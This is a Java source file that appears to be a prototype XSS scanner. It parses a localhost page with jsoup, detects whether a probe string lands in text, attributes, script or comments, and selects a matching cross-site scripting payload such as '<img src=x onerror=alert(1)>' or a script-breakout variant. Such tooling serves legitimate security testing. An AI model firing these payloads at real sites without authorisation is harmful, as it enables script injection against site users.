import java.io.IOException;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Attribute;
import org.jsoup.nodes.Attributes;
import org.jsoup.nodes.Comment;
import org.jsoup.nodes.DataNode;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.nodes.Node;
import org.jsoup.nodes.TextNode;
import org.jsoup.select.Elements;
import org.jsoup.select.NodeVisitor;

/**
 * @author kvivekanandan Apr 24, 2016 Launcher.java
 */

public class Launcher {
	static String url = "http://localhost:9615/HTMLAttributeValue.html";
	static String input = "baz";
	static String payload = "";

	static enum CONTEXT {
		SIMPLE_HTML, HTML_ATTRIBUTE_NAME, HTML_ATTRIBUTE_VALUE, HTML_COMMENTS, JAVASCRIPT_CONTEXT, CSS_CONTEXT
	};

	static CONTEXT context = null;

	public static void main(String[] args) {
		try {
			Document doc = Jsoup.connect(url).get();
			doc.traverse(new NodeVisitor() {
				@Override
				public void head(Node node, int arg1) {
					if (node instanceof TextNode) {
						TextNode tn = (TextNode) node;
						if (!tn.isBlank()) {
							String text = tn.text();
							if (text.contains(input)) {
								System.out.println("TEXT NODE contains input: " + text);
								context = CONTEXT.SIMPLE_HTML;
							}
						}
					}
					if (node instanceof DataNode) {
						DataNode dn = (DataNode) node;
						String data = dn.getWholeData();
						if (data != null && data.contains(input)) {
							System.out.println("DATA NODE contains input: " + data);
							String func = "(" + input + ")";
							String singleQuotes = "'" + input + "'";
							String doubleQuotes = "\"" + input + "\"";
							String singleLineComment = "//.*" + input + ".*\r\n";
							String doubleLineComment = "\\/\\*.*" + input + ".*\\*\\/";
							
							Pattern pFunc = Pattern.compile(func);
							Pattern pSingleQuotes = Pattern.compile(singleQuotes);
							Pattern pDoubleQuotes = Pattern.compile(doubleQuotes);
							Pattern pSingleLineComment = Pattern.compile(singleLineComment);
							Pattern pDoubleLineComment = Pattern.compile(doubleLineComment, Pattern.DOTALL);
							
							Matcher m = pFunc.matcher(data);
							if(m.find()){
								System.out.println("func pattern");
							}
							m = pSingleQuotes.matcher(data);
							if(m.find()){
								System.out.println("single quotes pattern");
							}
							m = pDoubleQuotes.matcher(data);
							
							if(m.find()){
								System.out.println("double quotes pattern");
							}
							 m = pSingleLineComment.matcher(data);
							if(m.find()){
								System.out.println("single line comment pattern");
							}
							 m = pDoubleLineComment.matcher(data);
							
							if(m.find()){
								System.out.println("multi line comment pattern");
							}
							

							context = CONTEXT.JAVASCRIPT_CONTEXT;
						}
					}
					if (node instanceof Element) {
						Element e = (Element) node;
						Attributes attributes = e.attributes();
						for (Attribute a : attributes) {
							if (a.getKey() != null && a.getKey().equals(input)) {
								System.out.println("ELEMENT NODENAME:" + e.nodeName());
								System.out.println("attribute name is equal to input");
								context = CONTEXT.HTML_ATTRIBUTE_NAME;
							}
							if (a.getValue() != null && a.getValue().equals(input)) {
								System.out.println("ELEMENT NODENAME:" + e.nodeName());
								System.out.println("attribute:: " + a.getKey() + " :: value is equal to input");
								context = CONTEXT.HTML_ATTRIBUTE_VALUE;
							}
						}
					}
					if (node instanceof Comment) {
						Comment c = (Comment) node;
						String comment = c.getData();
						if (comment != null && comment.contains(input)) {
							System.out.println("COMMENT NODE: " + comment);
							context = CONTEXT.HTML_COMMENTS;
						}
					}
				}

				@Override
				public void tail(Node node, int arg1) {
					// System.out.println("Exiting nodeName: " +
					// node.nodeName());

				}
			});

			switch (context) {
			case SIMPLE_HTML:
				payload = "<img src=x onerror=alert(1)>";
				break;
			case HTML_ATTRIBUTE_NAME:
				payload = "onclick=\"alert(1)";
				break;
			case HTML_ATTRIBUTE_VALUE:
				break;
			case JAVASCRIPT_CONTEXT:
				payload = "-</script><img src=x onerror=alert(1)>";
				break;
			case CSS_CONTEXT:
				break;
			case HTML_COMMENTS:
				payload = "--><img src=x onerror=alert(1)>";
				break;
			default:
				break;

			}
			// Elements elements = doc.select("*:containsOwn(" + input +")");
			// for(Element e : elements){
			//
			// System.out.println("nodename: "+e.nodeName());
			// System.out.println("css selector: "+e.cssSelector());
			// System.out.println("id: "+e.id());
			// System.out.println("own text: "+e.ownText());
			// System.out.println("tag: "+e.tag());
			// System.out.println("tagName: "+e.tagName());
			// System.out.println();
			// }
			// Elements attributes = doc.select("[" + input +"]");
			// System.out.println("ATTRIBUTES:");
			// for(Element e : elements){
			// System.out.println("nodename: "+e.nodeName());
			// System.out.println("css selector: "+e.cssSelector());
			// System.out.println("id: "+e.id());
			// System.out.println("own text: "+e.ownText());
			// System.out.println("tag: "+e.tag());
			// System.out.println("tagName: "+e.tagName());
			// System.out.println();
			// }
			// Elements attributeValue = doc.select("[*=" + input +"]");
			// System.out.println("ATTRIBUTE VALUE:");
			// for(Element e : elements){
			// System.out.println("nodename: "+e.nodeName());
			// System.out.println("css selector: "+e.cssSelector());
			// System.out.println("id: "+e.id());
			// System.out.println("own text: "+e.ownText());
			// System.out.println("tag: "+e.tag());
			// System.out.println("tagName: "+e.tagName());
			// System.out.println();
			// }
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
}
